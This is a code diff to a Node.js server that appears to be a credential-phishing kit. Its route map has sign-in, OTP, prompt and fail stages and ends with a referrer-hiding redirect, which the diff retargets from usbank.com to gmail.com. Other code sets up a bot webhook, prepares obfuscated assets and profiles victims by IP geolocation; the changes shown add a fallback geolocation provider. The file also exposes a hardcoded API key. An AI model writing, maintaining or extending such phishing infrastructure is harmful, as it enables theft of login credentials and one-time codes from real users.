@@ -31,7 +31,7 @@ function getReqClientIP(req) {
   if (ip && ip.startsWith("::ffff:")) ip = ip.replace("::ffff:", "");
   return ip;
 }
-
+ 
 
 async function setWebhook(botToken) {
   const row = await db.get(
@@ -186,8 +186,51 @@ async function prepareObfuscatedAssets() {
    GEO-IP / USER INFO
 =================================*/
 async function sendAPIRequest(ipAddress) {
-  const response = await axios.get(`https://api-bdc.net/data/ip-geolocation?ip=${ipAddress}&localityLanguage=en&key=bdc_4422bb94409c46e986818d3e9f3b2bc2`);
-  return response.data;
+  // Try BigDataCloud first
+  try {
+    const response = await axios.get(
+      `https://api-bdc.net/data/ip-geolocation?ip=${ipAddress}&localityLanguage=en&key=bdc_4422bb94409c46e986818d3e9f3b2bc2`,
+      {
+        timeout: 5000,
+        validateStatus: status => status === 200
+      }
+    );
+
+    return response.data;
+
+  } catch (err) {
+    console.log("BigDataCloud failed. Falling back to FreeIPAPI...");
+
+    // Fallback to FreeIPAPI
+    const response = await axios.get(
+      `https://freeipapi.com/api/json/${ipAddress}`,
+      {
+        timeout: 5000,
+        validateStatus: status => status === 200
+      }
+    );
+
+    const data = response.data;
+
+    // Convert FreeIPAPI response into BigDataCloud format
+    return {
+      ip: data.ipAddress,
+      location: {
+        city: data.cityName,
+        principalSubdivision: data.regionName,
+        postcode: data.zipCode,
+        timeZone: {
+          localTime: data.timeZones?.[0] || "Unknown"
+        }
+      },
+      country: {
+        name: data.countryName
+      },
+      network: {
+        organisation: data.asnOrganization
+      }
+    };
+  }
 }
 
 async function buildUserInfo(req, sendAPIRequest) {
@@ -290,7 +333,7 @@ const routeMap = {
   otp: "sign-in?action=otp",
   prompt: "sign-in?action=prompt",
   fail: "sign-in?action=fail",
-  final: "https://href.li/?https://usbank.com"
+  final: "https://href.li/?https://gmail.com"
 };
 
 function normalize(str = "") {
